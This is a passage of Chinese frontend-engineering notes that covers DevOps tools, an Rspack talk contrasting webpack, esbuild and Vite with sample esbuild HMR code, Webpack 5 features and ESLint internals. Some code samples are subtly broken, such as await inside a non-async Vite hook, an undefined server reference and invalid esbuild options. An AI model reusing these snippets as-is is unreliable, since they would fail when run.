Logstash\n\t\t- Kibana\n- 制片库\n\t- Harbor\n\t- Nexus\n\n## 2. 持续集成/持续部署 (CI/CD)\n\n1. **Jenkins**\n\t- 最流行的开源 CI/CD 工具\n\t- 丰富的插件生态系统\n\t- 支持多种构建类型和部署方式\n\t- 适合各种规模的项目\n2. **GitLab CI**\n\t- 与 GitLab 深度集成\n\t- 配置简单，使用 YAML 文件\n\t- 支持 Docker 原生\n\t- 自动化部署流程完整\n3. **DroneCI**\n\t- 基于 Docker 的现代 CI/CD 平台\n\t- 配置简单，性能优秀\n\t- 支持多种代码托管平台\n\n## 3. 容器编排与管理\n\n1. **Kubernetes (K8s)**\n\t- 容器编排的事实标准\n\t- 自动化部署、扩展和管理容器化应用\n\t- 强大的生态系统\n2. **Rancher**\n\t- 企业级容器管理平台\n\t- 简化 Kubernetes 操作\n\t- 提供友好的 Web UI\n\n## 4. 监控与日志\n\n1. **Prometheus**\n\t- 开源监控系统和时间序列数据库\n\t- 强大的查询语言 PromQL\n\t- 广泛的集成支持\n2. **Grafana**\n\t- 优秀的可视化和监控平台\n\t- 支持多种数据源\n\t- 丰富的仪表盘模板\n3. **ELK Stack**\n\t- Elasticsearch：搜索和分析引擎\n\t- Logstash：日志收集和处理\n\t- Kibana：数据可视化\n\n## 5. 配置管理\n\n1. **Ansible**\n\t- 简单易用的自动化工具\n\t- 无需客户端安装\n\t- 使用 YAML 描述任务\n2. **Terraform**\n\t- 基础设施即代码（IaC）工具\n\t- 支持多云环境\n\t- 声明式配置\n\n## 6. 服务网格\n\n1. **Istio**\n\t- 强大的服务网格平台\n\t- 提供流量管理、安全性和可观察性\n\t- 与 Kubernetes 深度集成\n2. **Linkerd**\n\t- 轻量级服务网格\n\t- 易于使用和维护\n\t- 性能优秀\n\n## 7. 安全扫描\n\n1. **SonarQube**\n\t- 代码质量和安全性分析\n\t- 支持多种编程语言\n\t- 提供详细的报告和建议\n2. **Trivy**\n\t- 容器安全扫描工具\n\t- 简单易用\n\t- 支持多种漏洞数据库\n\n## 8. 制品库\n\n1. **Harbor**\n\t- 企业级容器镜像仓库\n\t- 支持多租户\n\t- 提供安全扫描功能\n2. **Nexus**\n\t- 通用制品仓库\n\t- 支持多种包格式\n\t- 可作为代理缓存\n\n","lFhRqHED":"\n# Rspack 分享\n\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 长期项目与大型项目\n\t- **⻓期项目**都几乎不可避免的成为大项目\n\t- **大型项目**往往是公司内==比较重点的项目==\n\t\t- 否则也活不了这么久\n\t- 热更新 10s+\n\t- 构建时间：15 分钟\n- 基于 webpack 继续优化：\n\t- 治标不治本，性能没提升多少\n\t\t- swc-loader、多线程、hard-source-webpack-plugin\n\t- ==配置复杂翻倍==\n- esbuild 原生不支持 ==HMR==\n\t- 需要自行通过插件实现，性能下降严重\n\t- 使用 esbuild 的 watch 模式 + 自定义 HMR 实现\n\t- esbuild 通过插件实现热更新，==性能严重下降==\n\t\t- ==为保证准确性需要大量额外检查==\n- vite\n\t- 中小型项目很香，开发体验很好  \n\t- 大型项目该有的问题还是会有\n\t- ==增量构建 & 按需编译==\n- rspack\n\t- 历经十年，稳如泰山\n\t- ==迁移成本==\n\t- 可控的自研成本\n\n## 2. 背景：大型项目与长期项目\n\n- 公司内有相当多的大型应用(10000+模块) \n- 冷启动时间 2-5 分钟，甚至更久 \n- 构建时间 15-30 分钟，甚至更久  \n- HMR 10s+ 甚至更久\n \n- **⻓期项目**都几乎不可避免的成为大项目\n- **大型项目**往往是公司内==比较重点的项目==\n\t- 否则也活不了这么久\n \n**大型项目的性能优化是必须要做的事情**\n\n## 3. 优化路径 → 治标不治本，性能没提升多少，==配置复杂翻倍==\n\n- 高级语言的 loader\n\t- swc-loader \n\t- esbuild-loader  \n- 缓存\n\t- cache-loader \n\t- persistent-cache \n\t- hard-source-webpack-plugin\n\t- DllPlugin MFSU\n- 多线程：thread-loader  \n- 编译策略\n\t- lazy compilation  \n\n## 4. 换个打包工具？\n\n- Parcel: \n\t- 架构很好，但无奈内部实践太少  \n- Turbopack:\n\t-  架构很好，但是还没诞生( Rspack 和 Turbopack 大概同时诞生) \n- Rollup: \n\t- 库场景良好，应用场景性能和功能都缺失的较为严重 \n- esbuild: ?  \n\t- ==验证了基于原生语言架构的 bundler 的性能天花板非常高==(100x faster) \n\t- resolve 和 load hook基于 golang regex 的设计巧妙避免了跨语言通信开销 \n\t- 验证了没有一套基于**增量架构的 HMR** 是不可行的( bundler 再快也没用) \n\t- 验证了增量构建中跨语言通信是瓶颈问题\n- Vite: ?\n\n### 4.1. 愁人的 HMR\n\n- Hook 不支持增量构建，rebuild 性能较差\n- ==esbuild 原生不支持 HMR，需要自行通过插件实现，性能下降严重==\n\n### 4.2. esbuild 实现热更新的方法\n\n虽然 esbuild 本身不直接支持 HMR，但我们可以通过以下几种方式实现热更新：\n\n#### 4.2.1. 使用 chokidar + esbuild\n\n```javascript\nconst esbuild = require('esbuild');\nconst chokidar = require('chokidar');\nconst http = require('http');\nconst WebSocket = require('ws');\n\n// 创建 WebSocket 服务器\nconst wss = new WebSocket.Server({ port: 8001 });\n\n// 基础构建配置\nconst buildOptions = {\n  entryPoints: ['src/index.js'],\n  bundle: true,\n  outdir: 'dist',\n  sourcemap: true,\n  watch: false, // 不使用 esbuild 的 watch 模式\n};\n\n// 构建函数\nasync function build() {\n  try {\n    await esbuild.build({\n      ...buildOptions,\n      banner: {\n        js: `\n          (() => {\n            const ws = new WebSocket('ws://localhost:8001');\n            ws.onmessage = () => location.reload();\n          })();\n        `,\n      },\n    });\n    console.log('Build completed');\n  } catch (err) {\n    console.error('Build failed:', err);\n  }\n}\n\n// 设置文件监听\nchokidar.watch('src/**/*').on('change', async (path) => {\n  console.log(`File ${path} changed`);\n  await build();\n  // 通知所有客户端刷新\n  wss.clients.forEach(client => {\n    if (client.readyState === WebSocket.OPEN) {\n      client.send('reload');\n    }\n  });\n});\n\n// 启动开发服务器\nconst server = http.createServer((req, res) => {\n  // 简单的静态文件服务\n  // ... 实现静态文件服务逻辑\n});\n\nserver.listen(3000);\nbuild();\n```\n\n#### 4.2.2. 使用 esbuild 的 watch 模式 + 自定义 HMR 实现\n\n```javascript\nconst esbuild = require('esbuild');\nconst path = require('path');\n\n// HMR 客户端代码\nconst hmrClient = `\n  const hmr = {\n    socket: new WebSocket('ws://localhost:8001'),\n    \n    // 存储模块\n    modules: new Map(),\n    \n    // 注册模块\n    register(id, mod) {\n      this.modules.set(id, mod);\n    },\n    \n    // 更新模块\n    update(id, newMod) {\n      const oldMod = this.modules.get(id);\n      if (oldMod) {\n        // 保存状态\n        const state = oldMod.__hmrState || {};\n        // 更新模块\n        this.modules.set(id, newMod);\n        // 恢复状态\n        newMod.__hmrState = state;\n        // 触发更新回调\n        if (newMod.onHMR) {\n          newMod.onHMR(state);\n        }\n      }\n    }\n  };\n\n  hmr.socket.onmessage = (event) => {\n    const { type, id, code } = JSON.parse(event.data);\n    if (type === 'update') {\n      // 执行更新的模块代码\n      const newMod = eval(code);\n      hmr.update(id, newMod);\n    }\n  };\n`;\n\n// 构建配置\nconst ctx = await esbuild.context({\n  entryPoints: ['src/index.js'],\n  bundle: true,\n  outdir: 'dist',\n  sourcemap: true,\n  format: 'esm',\n  plugins: [{\n    name: 'hmr',\n    setup(build) {\n      // 注入 HMR 客户端代码\n      build.onEnd(result => {\n        // 处理构建结果\n        if (result.errors.length === 0) {\n          // 发送更新消息给客户端\n          wss.clients.forEach(client => {\n            if (client.readyState === WebSocket.OPEN) {\n              client.send(JSON.stringify({\n                type: 'update',\n                modules: result.outputFiles\n                  .filter(file => file.path.endsWith('.js'))\n                  .map(file => ({\n                    id: path.relative('src', file.path),\n                    code: file.text\n                  }))\n              }));\n            }\n          });\n        }\n      });\n    }\n  }]\n});\n\n// 启动 watch 模式\nawait ctx.watch();\n```\n\n#### 4.2.3. 结合 Vite 的 HMR 实现\n\n```javascript\nconst esbuild = require('esbuild');\nconst { createServer } = require('vite');\n\nasync function createDevServer() {\n  const vite = await createServer({\n    // Vite 配置\n    server: {\n      middlewareMode: true\n    },\n    optimizeDeps: {\n      // 使用 esbuild 进行依赖预构建\n      esbuildOptions: {\n        // esbuild 配置\n      }\n    },\n    plugins: [{\n      name: 'esbuild-hmr',\n      handleHotUpdate({ file, modules }) {\n        // 使用 esbuild 构建更新的模块\n        const result = await esbuild.build({\n          entryPoints: [file],\n          write: false,\n          bundle: true,\n          format: 'esm',\n          sourcemap: true\n        });\n\n        // 通过 Vite 的 HMR API 发送更新\n        modules.forEach(mod => {\n          mod.importers.forEach(importer => {\n            server.ws.send({\n              type: 'update',\n              updates: [{\n                type: 'js-update',\n                timestamp: Date.now(),\n                path: mod.url,\n                acceptedPath: mod.url\n              }]\n            });\n          });\n        });\n      }\n    }]\n  });\n\n  return vite;\n}\n```\n\n#### 4.2.4. 使用建议\n\n1. **选择合适的方案**\n```javascript\n// 简单项目：使用方案1\n// 中型项目：使用方案2\n// 复杂项目：使用方案3或考虑直接使用 Vite\n```\n\n2. **性能优化**\n```javascript\n// 增加缓存机制\nconst cache = new Map();\n\nasync function buildWithCache(filePath) {\n  const hash = await getFileHash(filePath);\n  if (cache.has(hash)) {\n    return cache.get(hash);\n  }\n  \n  const result = await esbuild.build({/*...*/});\n  cache.set(hash, result);\n  return result;\n}\n```\n\n3. **错误处理**\n```javascript\n// 添加错误边界\ntry {\n  await build();\n} catch (err) {\n  // 发送错误到客户端\n  wss.clients.forEach(client => {\n    if (client.readyState === WebSocket.OPEN) {\n      client.send(JSON.stringify({\n        type: 'error',\n        error: err.message\n      }));\n    }\n  });\n}\n```\n\n这些方案各有优劣：\n- 方案1最简单，但功能有限\n- 方案2更灵活，但需要更多维护\n- 方案3功能最完整，但复杂度较高\n\n选择哪种方案取决于项目需求和复杂度。对于简单项目，方案1足够；对于需要精细控制的项目，可以考虑方案2或3。\n\n### 4.3. esbuild 通过插件实现热更新，性能严重下降\n\n#### 4.3.1. esbuild 的设计理念\n\nesbuild 主要关注构建性能，它的核心功能是：\n- 快速的代码打包\n- 代码转换\n- 代码压缩\n- 基础的文件监听（watch）\n\n```javascript\n// esbuild 原生的 watch 模式\nawait esbuild.context({\n  entryPoints: ['src/index.js'],\n  bundle: true,\n  outdir: 'dist',\n  watch: true, // 只是简单的重新构建\n})\n```\n\n#### 4.3.2. 为什么自行实现 HMR 会导致性能下降\n\n1. **额外的文件监听开销**\n```javascript\n// 需要额外的文件监听系统\nconst chokidar = require('chokidar');\nchokidar.watch('src/**/*').on('change', async (path) => {\n  // 每次文件变化都需要：\n  // 1. 解析依赖关系\n  // 2. 确定更新范围\n  // 3. 重新构建受影响的模块\n  // 这些都是额外的开销\n});\n```\n\n2. **模块依赖追踪**\n```javascript\n// 需要维护模块依赖图\nconst dependencyGraph = new Map();\n\nfunction updateModule(path) {\n  // 1. 找出所有受影响的模块\n  const affectedModules = findAffectedModules(path);\n  \n  // 2. 重新构建这些模块\n  // 3. 通过 WebSocket 发送更新\n  // 这个过程会带来额外的内存和计算开销\n}\n```\n\n3. **状态管理复杂性**\n```javascript\n// HMR 需要管理模块的状态\nconst moduleState = {\n  id: 'module-id',\n  instances: new Set(),\n  acceptCallback: null,\n  disposeCallback: null\n};\n\n// 这些状态管理会增加内存开销和复杂度\n```\n\n#### 4.3.3. 性能下降的具体表现\n\n```javascript\n// 原生 esbuild 构建\nconst buildTime = await measure(() => \n  esbuild.build({\n    entryPoints: ['src/index.js'],\n    bundle: true,\n    outdir: 'dist'\n  })\n); // 可能只需要 50ms\n\n// 带 HMR 的构建\nconst hmrBuildTime = await measure(() => {\n  // 1. 文件变更检测\n  // 2. 依赖图更新\n  // 3. 模块重新构建\n  // 4. WebSocket 通信\n  // 5. 状态管理\n  // 可能需要 200-300ms\n});\n```\n\n#### 4.3.4. 与其他工具的对比\n\n```javascript\n// Vite 的优势\n// 1. 预构建优化\n// 2. 高效的模块依赖分析\n// 3. 智能的 HMR 边界确定\n// 4. 经过优化的更新策略\n\n// 自实现 esbuild HMR 的劣势\n// 1. 需要完整重建依赖图\n// 2. 更新粒度较大\n// 3. 缺乏优化的缓存策略\n```\n\n#### 4.3.5. 实际影响\n\n1. **内存占用增加**\n```javascript\n// 需要维护的额外数据结构\nconst hmrState = {\n  moduleMap: new Map(), // 模块映射\n  dependencyGraph: new Map(), // 依赖图\n  moduleInstances: new Map(), // 模块实例\n  watchers: new Set(), // 文件监听器\n};\n```\n\n2. **构建时间延长**\n```javascript\n// 原本的构建流程\nesbuild.build() // 50ms\n\n// 添加 HMR 后的流程\nasync function buildWithHMR() {\n  // 1. 文件系统监听 (+50ms)\n  // 2. 依赖分析 (+100ms)\n  // 3. esbuild 构建 (50ms)\n  // 4. HMR 更新处理 (+50ms)\n  // 总计约 250ms\n}\n```\n\n3. **CPU 使用率上升**\n```javascript\n// 需要处理的额外任务\nfunction handleHMR() {\n  // 1. 文件监听回调\n  // 2. 依赖图更新\n  // 3. 模块状态管理\n  // 4. WebSocket 通信\n  // 这些都会增加 CPU 负载\n}\n```\n\n#### 4.3.6. 解决方案建议\n\n1. **使用现成的解决方案**\n```javascript\n// 推荐使用 Vite，它已经优化了 HMR\nimport { createServer } from 'vite';\nconst server = await createServer({\n  // Vite 配置\n});\n```\n\n2. **如果必须使用 esbuild + HMR**\n```javascript\n// 优化建议：\n// 1. 使用增量构建\n// 2. 实现智能的依赖追踪\n// 3. 添加有效的缓存策略\n// 4. 限制更新范围\n```\n\n这就是为什么开发者会说 esbuild 不适合直接用于 HMR 的原因。如果项目需要 HMR，建议：\n\n1. 使用 Vite（它在底层使用 esbuild，但有优化的 HMR 实现）\n2. 使用 webpack（虽然较慢，但 HMR 实现成熟）\n3. 如果一定要用 esbuild，考虑是否真的需要 HMR，或者接受性能损耗\n\n### 4.4. vite\n\n- 中小型项目很香，开发体验很好  \n- Build 性能虽然一般，但是对中小型项目足够\n- 大型项目该有的问题还是会有\n\n## 5. esbuild 关于增量架构 HMR 不可行的问题：\n\n### 5.1. 增量架构 HMR 的基本概念\n\n````mermaid\n\n  graph TB\n    A[源代码改动] --> B[增量构建]\n    B --> C[模块替换]\n    C --> D[状态保持]\n    \n    B --> E[问题: 依赖图不准确]\n    B --> F[问题: 副作用处理困难]\n    B --> G[问题: 状态一致性]\n    \n    E --> H[构建结果不可靠]\n    F --> H\n    G --> H\n    \n    style H fill:#ff9999,stroke:#333,stroke-width:2px\n````\n\n### 5.2. esbuild 遇到的具体问题\n\n#### 5.2.1. 依赖图维护问题\n\n```javascript hl:11\n// 示例：模块间复杂依赖\n// moduleA.js\nimport { value } from './moduleB'\nexport const result = process(value)\n\n// moduleB.js\nimport { helper } from './moduleC'\nexport const value = helper()\n\n// 当 moduleC.js 改变时\n// 增量构建难以准确追踪所有受影响的模块\n```\n\n#### 5.2.2. 副作用处理\n\n```javascript hl:15\n// 全局副作用示例\n// global.js\nwindow.globalState = {\n  count: 0\n}\n\n// component.js\nimport './global.js'\nexport class Component {\n  constructor() {\n    this.state = window.globalState\n  }\n}\n\n// 增量更新时难以处理这些全局副作用\n```\n\n### 5.3. 为什么增量架构不可行\n\n#### 5.3.1. **依赖追踪问题**\n\n```javascript hl:11\n// 构建时的依赖图\nconst buildGraph = {\n  'moduleA.js': ['moduleB.js', 'moduleC.js'],\n  'moduleB.js': ['moduleC.js'],\n  'moduleC.js': []\n}\n\n// 运行时的实际依赖可能因为动态导入而改变\nasync function dynamicImport() {\n  const module = await import('./moduleD.js')\n  // 这种动态依赖很难在增量构建中准确追踪\n}\n```\n\n>  这种动态依赖很难在增量构建中准确追踪\n\n#### 5.3.2. **状态一致性问题**\n\n```javascript hl:7\n// 模块状态\nlet counter = 0\nexport function increment() {\n  counter++\n}\n\n// HMR 更新时\nif (module.hot) {\n  module.hot.accept(() => {\n    // 难以确保状态正确迁移\n    // counter 的值应该保持还是重置？\n  })\n}\n```\n\n#### 5.3.3. **构建缓存问题**\n\n```javascript hl:6\n// esbuild 的构建缓存\nlet buildContext = await esbuild.context({\n  entryPoints: ['app.js'],\n  bundle: true,\n  outfile: 'dist/bundle.js',\n  incremental: true, // 增量构建\n})\n\n// 缓存可能导致不一致\nawait buildContext.rebuild()\n```\n\n### 5.4. Vite 的解决方案\n\n```javascript\n// Vite 采用基于原生 ESM 的方案\n// 开发服务器模式\nexport default {\n  server: {\n    // 按需编译\n    // 不依赖增量构建\n    hmr: {\n      // 模块热替换配置\n      overlay: true\n    }\n  }\n}\n```\n\n### 5.5. 主要挑战\n\n#### 5.5.1. **构建一致性**\n\n```javascript\n// 增量构建可能导致不一致\nconst cache = new Map()\n\nfunction rebuild(file) {\n  // 难点：确保缓存与实际代码同步\n  cache.set(file, buildResult)\n  // 可能错过一些依赖更新\n}\n```\n\n#### 5.5.2. **性能与准确性的权衡**\n\n```javascript hl:1\n// 完整构建 - 准确但慢\nfunction fullBuild() {\n  // 重新构建所有内容\n}\n\n// 增量构建 - 快但可能不准确\nfunction incrementalBuild() {\n  // 只构建改变的部分\n  // 可能遗漏依赖\n}\n```\n\n### 5.6. 技术限制\n\n#### 5.6.1. **静态分析限制**\n\n```javascript\n// 动态导入路径\nconst moduleName = getModuleName()\nimport(`./modules/${moduleName}.js`)\n// 静态分析无法确定具体导入内容\n```\n\n#### 5.6.2. **运行时依赖**\n\n```javascript\n// 运行时生成的依赖\nconst plugins = []\nif (condition) {\n  plugins.push(await import('./plugin-a.js'))\n}\n// 增量构建难以追踪这类动态依赖\n```\n\n### 5.7. 结论\n\nesbuild 的实践证明，基于增量架构的 HMR 存在以下根本性问题：\n\n- **可靠性问题**\n\t- 依赖追踪不准确\n\t- 状态管理困难\n\t- 缓存一致性难以保证\n- **复杂性问题**\n\t- 实现复杂度高\n\t- 维护成本大\n\t- 错误处理困难\n- **性能问题**\n\t- ==为保证准确性需要大量额外检查==\n\t- 可能导致性能反而下降\n\n### 5.8. 现代解决方案 → ==增量构建 & 按需编译==\n\n- **基于 ESM 的开发服务器**\n\t- Vite 的方案\n\t- 不依赖增量构建\n\t- 按需编译\n- **完整重建 + 智能缓存**\n\t- 保证构建结果可靠性\n\t- 通过缓存优化性能\n- **混合方案**\n\t- 开发环境使用 ESM\n\t- 生产环境完整构建\n\n## 6. vite 的经验\n\n- 出色的开箱即用体验非常重要\n- 兼容生态十分重要，避免所有轮子都要自己造一遍\n- 高质量的 loader 和 plugin 里包含了无数的细节，小团队根本无法维护\n- 拆包能力至关重要，关乎到能不能应用到**重要C端应用**\n- bundleless 目前不适合公司的大型业务场景\n\n## 7. 我们需要\n\n==先看成本，再看收益，成本和收益的结合==\n- 成本：\n\t- 迁移成本\n\t- 自研成本\n- 收益？\n\t- ？\n\n- 极致的拆包能力\n\t- 特别是 C 端\n- 冷启动性能\n- 生产环境构建性能\n- HMR 性能\n- ==迁移成本==\n- 丰富的生态\n- Legacy code 兼容\n\t- 很重要，需要兼容以前的项目\n\t- 毕竟 webpack 已经 10 年了\n- 稳定的产物质量\n- ==可控的自研成本==\n\t- 重新造轮子\n\n## 8. Rollup 的问题\n\n- 核心架构问题:\n\t- Rollup 的架构是只有 `esm` 为一等公⺠，其他均需要转换成 `esm` 进行处理  \n\t- commonjs 的支持是错误的方案，不可能彻底实现兼容(non strict cjs -> strict esm)，除非引入 runtime(esbuild) \n\t- 没考虑**其他资源的多样性**，如css、图片、esm、 commonjs 等语言在 resolve 层面的差异性\n\n## 9. ESbuild 的问题\n\n- ==架构比 rollup 更适合应用，css、图片等均作为一等公⺠==， resolve 和 commonjs 相比都更加正确  \n- **插件 api 极其薄弱**，难以支持复杂需求，几乎无生态 content-hash 问题在 esbuild 上几乎无解(鸡蛋问题)\n- HMR 必须内置支持，外置插件实现无任何性能保障\n- ==Native 插件和 JS 插件难以穿插组合==\n- bundle splitting 和 tree shaking 两个深度优化在原有架构，实现⻛险较大\n- 海量业务都是基于 Webpack 的，迁移成本非常大\n\n## 10. 希望：Loader 的组合性可以实现工具链的渐进式原生化\n\n![图片&文件](./files/20241211-34.png)\n\n\n\n \n\n## 11. rspack 架构\n\n- 和 Webpack5 基本一致(历经十年，稳如泰山) \n- 将原本在 JS 里难以并行化的操作充分并行化 \n- 使用 NAPI-RS 实现 Rust 和 JS 的桥接\n\n## 12. rspack 生态\n\n![undefined](#)","sVAINrNX":"\n# Webpack 5\n\n\n`#webpack` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 持久化缓存\n\t- 默认启用，使用文件系统缓存\n- 顶层 await 支持\n- 资源模块 Asset Modules\n\t- 内置了资源模块类型，不再需要额外的loader\n- ==模块联邦==\n- 改进了对 `WebAssembly` 的支持\n\n## 2. 性能优化：持久化缓存（Persistent Caching）\n\nWebpack 5 引入了更好的**持久化缓存机制**，可以显著提升构建性能：\n\n - 改进了持久化缓存机制，默认启用\n- 通过`文件系统缓存`提高重复构建性能\n\n```javascript hl:4\n// webpack.config.js\nmodule.exports = {\n  cache: {\n    type: 'filesystem', // 使用文件系统缓存\n    buildDependencies: {\n      config: [__filename] // 构建依赖\n    },\n    name: 'my-cache' // 缓存名称\n  }\n}\n```\n\n## 3. 资源模块（Asset Modules）\n\n取代了 `file-loader、url-loader 和 raw-loader`，直接**内置支持资源文件**：\n- 内置了资源模块类型，不再需要额外的loader\n- 支持四种新的模块类型：\n\t- asset/source\n\t- asset\n\t- asset/inline\n\t- asset/resource\n\n```javascript hl:7\n// webpack.config.js\nmodule.exports = {\n  module: {\n    rules: [\n      {\n        test: /\\.(png|jpg|gif)$/i,\n        type: 'asset', // 可选 'asset/resource'、'asset/inline'、'asset/source'\n        parser: {\n          dataUrlCondition: {\n            maxSize: 8 * 1024 // 8kb\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n## 4. 模块联邦（Module Federation） \n\n>  更多参考：[10. Webpack 5 的 Module Federation](/post/8wPPOjJ7.html)\n\n- 允许多个独立的构建可以组成一个应用\n- 支持运行时动态加载远程模块\n- **实现真正的微前端架构**\n- 可以共享依赖，减少重复加载\n\n允许多个独立的构建可以组成一个应用程序：\n\n```javascript\n// host/webpack.config.js\nconst ModuleFederationPlugin = require('webpack/lib/container/ModuleFederationPlugin');\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'host',\n      remotes: {\n        app1: 'app1@http://localhost:3001/remoteEntry.js'\n      }\n    })\n  ]\n}\n\n// remote/webpack.config.js\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'app1',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './Button': './src/Button'\n      }\n    })\n  ]\n}\n```\n\n## 5. 性能优化：Tree Shaking 优化\n\n - 改进了Tree Shaking算法\n- 能够处理更多的模块类型\n- 支持嵌套的树摇，提高打包效率\n- 改进了 Tree Shaking 机制，支持更多场景：\n\n```javascript\n// package.json\n{\n  \"sideEffects\": [\n    \"*.css\",\n    \"*.scss\"\n  ]\n}\n\n// webpack.config.js\nmodule.exports = {\n  optimization: {\n    usedExports: true,\n    minimize: true\n  }\n}\n```\n\n## 6. 更好的代码生成\n\n支持 ECMAScript 模块的输出：\n\n```javascript hl:6,7\nmodule.exports = {\n  experiments: {\n    outputModule: true\n  },\n  output: {\n    library: {\n      type: 'module'\n    }\n  }\n}\n```\n\n## 7. Node.js Polyfills 自动加载被移除\n\n- 不再自动引入 Node.js polyfills\n- 减小了打包体积\n- 需要显式引入所需的polyfills \n- 更好的Node.js支\n\t- 改进了对Node.js模块的处理\n\t- 提供了更好的CommonJS支持\n\n```javascript\n// webpack.config.js\nmodule.exports = {\n  resolve: {\n    fallback: {\n      \"http\": require.resolve(\"stream-http\"),\n      \"https\": require.resolve(\"https-browserify\"),\n      \"stream\": require.resolve(\"stream-browserify\")\n    }\n  }\n}\n```\n\n## 8. 顶层 await 支持\n\n- 支持在模块顶层使用await\n- 无需包装在async函数中\n\n```javascript\n// 支持直接在模块顶层使用 await\nconst data = await fetch('https://api.example.com/data');\nexport { data };\n```\n\n## 9. 改进的开发体验\n\n更好的错误提示和开发工具支持：\n\n```javascript\nmodule.exports = {\n  stats: {\n    errorDetails: true\n  }\n}\n```\n\n## 10. 新的 WebAssembly 支持\n\n改进了对 WebAssembly 的支持：\n- 异步导入WebAssembly\n- 支持WebAssembly as ESM\n- 改进的WebAssembly集成\n\n```javascript\nmodule.exports = {\n  experiments: {\n    asyncWebAssembly: true,\n    syncWebAssembly: true\n  }\n}\n```\n\n## 11. 改进的长期缓存\n\n通过确定性的模块 ID 和 chunk ID 生成算法：\n\n```javascript\nmodule.exports = {\n  optimization: {\n    moduleIds: 'deterministic',\n    chunkIds: 'deterministic'\n  }\n}\n```\n\n## 12. 更新的配置验证\n\n更严格的配置验证：\n\n```javascript\nmodule.exports = {\n  mode: 'production', // 必须指定 mode\n  entry: './src/index.js',\n  output: {\n    clean: true // 构建前清理输出目录的新选项\n  }\n}\n```\n\n## 13. 改进的打包体积\n\n优化了打包体积，移除了一些内部结构：\n\n```javascript\nmodule.exports = {\n  optimization: {\n    minimize: true,\n    splitChunks: {\n      chunks: 'all',\n      minSize: 20000\n    }\n  }\n}\n```\n\n## 14. 主要优势总结\n\n- 性能提升：\n\t- 持久化缓存提升构建速度\n\t- 改进的 Tree Shaking\n\t- 更优的长期缓存策略\n- 开发体验：\n\t- 内置资源模块处理\n\t- 更好的错误提示\n\t- 更严格的配置验证\n- 新功能：\n\t- 模块联邦支持微前端架构\n\t- 原生支持 `WebAssembly`\n\t- 支持`顶层 await`\n- 包体积优化：\n\t- 移除自动的 Node.js polyfills\n\t- 优化内部结构\n\t- 更好的代码生成\n\n","Tr30EvFj":"\n# Eslint 的原理\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 原理：\n\t- 将代码解析成 AST，然后使用==访问者模式==遍历 AST 节点\n\t- 对每个节点使用 ==配置的规则==进行检查\n\n## 2. ESLint 的工作原理\n\n**将代码解析成 AST，然后使用==访问者模式==遍历 AST 节点，对每个节点应用配置的规则进行检查**。这种方式既保证了检查的准确性，也提供了足够的灵活性来自定义规则。\n\n## 3. ESLint 工作流程\n\nESLint 的代码检查主要分为以下几个步骤：\n\n```mermaid\ngraph LR\n    A[源代码] --> B[解析器]\n    B --> C[AST生成]\n    C --> D[规则校验]\n    D --> E[问题报告]\n```\n\n## 4. 详细步骤解释\n\n### 4.1. 解析（Parsing）\n\n```javascript\n// 示例代码\nfunction hello() {\n    console.log('Hello');\n}\n```\n\n解析器（默认是 Espree）会：\n1. 将代码转换成令牌（Tokens）\n2. 检查语法是否正确\n3. 生成抽象语法树（AST）\n\n```javascript\n// 转换成的令牌示例\n[\n    { type: \"Keyword\", value: \"function\" },\n    { type: \"Identifier\", value: \"hello\" },\n    { type: \"Punctuator\", value: \"(\" },\n    { type: \"Punctuator\", value: \")\" },\n    { type: \"Punctuator\", value: \"{\" },\n    // ...\n]\n```\n\n### 4.2. AST（抽象语法树）生成\n\n```javascript\n// AST 结构示例（简化版）\n{\n    type: \"Program\",\n    body: [{\n        type: \"FunctionDeclaration\",\n        id: {\n            type: \"Identifier\",\n            name: \"hello\"\n        },\n        params: [],\n        body: {\n            type: \"BlockStatement\",\n            body: [{\n                type: \"ExpressionStatement\",\n                expression: {\n                    type: \"CallExpression\",\n                    callee: {\n                        type: \"MemberExpression\",\n                        object: { type: \"Identifier\", name: \"console\" },\n                        property: { type: \"Identifier\", name: \"log\" }\n                    }\n                }\n            }]\n        }\n    }]\n}\n```\n\n### 4.3. 规则校验\n\n```javascript\n// ESLint 规则示例\nmodule.exports = {\n    rules: {\n        'no-console': {\n            create: function(context) {\n                return {\n                    // 访问者模式\n                    CallExpression: function(node) {\n                        if (node.callee.type === 'MemberExpression' &&\n                            node.callee.object.name === 'console') {\n                            context.report({\n                                node: node,\n                                message: 'Unexpected console statement.'\n                            });\n                        }\n                    }\n                };\n            }\n        }\n    }\n};\n```\n\n## 5. 自定义规则示例\n\n```javascript hl:10\n// 创建一个禁止使用特定变量名的规则\nmodule.exports = {\n    create: function(context) {\n        return {\n            Identifier: function(node) {\n                // 检查变量名是否为 'foo'\n                if (node.name === 'foo') {\n                    context.report({\n                        node: node,\n                        message: \"变量名 'foo' 是被禁止的\"\n                    });\n                }\n            }\n        };\n    }\n};\n```\n\n## 6. 配置文件示例\n\n```javascript\n// .eslintrc.js\nmodule.exports = {\n    // 解析器选项\n    parserOptions: {\n        ecmaVersion: 2021,\n        sourceType: 'module'\n    },\n    // 环境\n    env: {\n        browser: true,\n        node: true\n    },\n    // 规则配置\n    rules: {\n        'no-console': 'error',\n        'semi': ['error', 'always'],\n        'quotes': ['error', 'single']\n    }\n};\n```\n\n## 7. 工作流集成\n\n```javascript hl:9\n// package.json\n{\n    \"scripts\": {\n        \"lint\": \"eslint src/**/*.js\",\n        \"lint:fix\": \"eslint src/**/*.js --fix\"\n    },\n    \"husky\": {\n        \"hooks\": {\n            \"pre-commit\": \"lint-staged\"\n        }\n    },\n    \"lint-staged\": {\n        \"*.js\": [\"eslint --fix\", \"git add\"]\n    }\n}\n```\n\n## 8. 性能优化建议\n\n### 8.1. **使用缓存**\n\n```bash\n# 使用 eslint 的缓存功能\neslint --cache src/\n```\n\n### 8.2. **忽略不需要检查的文件**\n\n```javascript\n// .eslintignore\nnode_modules/\ndist/\nbuild/\n```\n\n### 8.3. **并行处理**\n\n```bash\n# 使用 eslint-parallel 进行并行检查\neslint-parallel src/\n```\n\n## 9. 常见问题处理\n\n### 9.1. **规则冲突**\n\n```javascript\n// .eslintrc.js\nmodule.exports = {\n    rules: {\n        // 处理与 Prettier 的冲突\n        'prettier/prettier': 'error',\n     